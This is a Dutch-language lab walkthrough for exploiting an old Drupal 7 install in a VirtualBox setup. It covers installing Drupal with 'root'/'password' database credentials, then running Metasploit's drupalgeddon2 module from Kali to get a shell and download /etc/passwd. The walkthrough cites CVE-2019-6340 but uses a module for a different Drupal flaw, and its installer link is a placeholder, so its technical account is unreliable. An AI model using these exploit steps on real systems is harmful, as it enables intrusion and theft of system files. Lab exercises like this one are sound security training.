# CVE-2019-6340

## Drupal 7.x en 8.x - - RESTful Web Services unserialize() Remote Command Execution [Exploit](https://nvd.nist.gov/vuln/detail/CVE-2019-6340)

- we kunnen door een exploit die veroorzaakt is door een sanitization fout in de `Drupal 7/8 RESTful Web Services` module, een remote php code execution uitvoeren.

- We gaan [module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/drupal_drupalgeddon2.md) gebruiken van metasploit om de exploit uit te voeren.

- we moeten hiervoor eerst drupal installeren en de module `RESTful Web Services` installeren.

## VM Setup

- We gebruiken een debian 11 desktop vm vdi van osboxes (zodat we makkelijk kunnen copypasten).

- We gebruiken vboxmanage om de vm te maken en te starten, deze zal een simpele debian 11 gui vm aanmaken met 2gb ram en 2 cpu cores, deze vm zal ook 2 netwerk adapters hebben, 1 voor de host-only adapter en 1 voor de NAT adapter.

## drupal installeren

- we gaan eerst wget installeren zodat we de drupal installatie script kunnen downloaden.

```bash
sudo apt-get update
sudo apt-get install wget
```

- daarna gaan we mysql-server 5.7 repository opzetten (8 werkt niet met drupal 7).
Het zal vragen welke versie we willen installeren, we kiezen eerst voor debian buster (10) en dan voor mysql 5.7.

```bash
    wget https://dev.mysql.com/get/mysql-apt-config_0.8.18-1_all.deb &&
    sudo dpkg -i mysql-apt-config_0.8.18-1_all.deb 
```

- we kunnen eindelijk onze script downloaden en runnen.

```bash
    sudo wget drupalInstall.shLinK To be added &&
    sudo chmod +x drupalInstall.sh &&
    sudo ./drupalInstall.sh
```

- deze script zal drupal 7.54 installeren en de mysql database opzetten.
met root als gebruikersnaam en wachtwoord password voor de database.
er zal ook een drupal database aangemaakt worden met de naam drupal en password als wachtwoord.

- De nodige modules zullen ook gedownload worden(je moet wel nog de modules activeren in de drupal admin panel).


- als de script klaar is zou je normaal gezien drupal moeten kunnen bereiken op http://localhost/index.php of http://xxx.xxx.xxx.xxx/index.php (xxx.xxx.xxx.xxx is het ip van de vm) als u vanop een andere de kali vm wilt bereiken.

- we doen de basis configuratie van drupal en maken een admin account aan.

- voor we verder gaan voeren we nog een laatste commando uit om de drupal installatie te vervolledigen.

```bash
sudo rm -rvf /var/www/html/index.html
```

- dit is nodig of we zullen steeds redirected worden naar index.html.

- we zetten entity en restful web services aan in de modules pagina.

- vanop kali vm gaan we de exploit uitvoeren.

## Exploit

- we starten metasploit op en zoeken de exploit.

```bash
msfconsole
```

- we gaan een externe module  gebruiken die we gevonden hebben.

```bash
use exploit/unix/webapp/drupal_drupalgeddon2
```

- we gaan de exploit configureren.

```bash
set lhost xxx.xxx.xxx.xxx (ip van de vm)
set verbose true
check
run
```

- als alles goed is gegaan zou je nu van op uw terminal een shell moeten hebben op de vm.

- testen of het werkt.

```bash
ls (zou de inhoud van de huidige directory moeten tonen)
shell (open een shell)
ip a (toont de ip adressen van de vm)
exit (sluit de shell)
download /etc/passwd (download het passwd bestand)
download /home/osboxes/capture.txt (download het capture.txt bestand)
```

deze files kan je vinden in de home folder van uw kali vm.

## notes

- voor de externe module te gebruiken moet je een connectie hebben met het internet
- uw kali vm moet een host-only adapter als dezelfde die de vm heeft.
- errors zullen verschijnen op up drupal pagina, dit komt door php versie 7.4 die niet compatibel is met drupal 7.